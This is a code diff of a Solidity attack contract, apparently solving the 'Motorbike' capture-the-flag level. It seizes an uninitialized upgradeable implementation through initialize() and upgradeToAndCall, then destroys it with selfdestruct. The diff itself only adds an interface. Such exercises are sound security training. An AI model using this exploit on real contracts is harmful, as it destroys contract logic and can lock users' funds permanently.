@@ -6,14 +6,19 @@ interface IEngine {
     function upgradeToAndCall(address newImplementation, bytes memory data) external payable;
 }
 
-contract MyMotorbikeAttack {
-    function attack(address implementation) external {
+interface IAttack {
+    function attack(address implementation) external;
+    function destroy() external;
+}
+
+contract MyMotorbikeAttack is IAttack {
+    function attack(address implementation) external override {
         IEngine impl = IEngine(implementation);
         impl.initialize();
         impl.upgradeToAndCall(address(this), abi.encodeWithSignature("destroy()"));
     }
 
-    function destroy() external {
+    function destroy() external override {
         selfdestruct(payable(msg.sender));
     }
 }
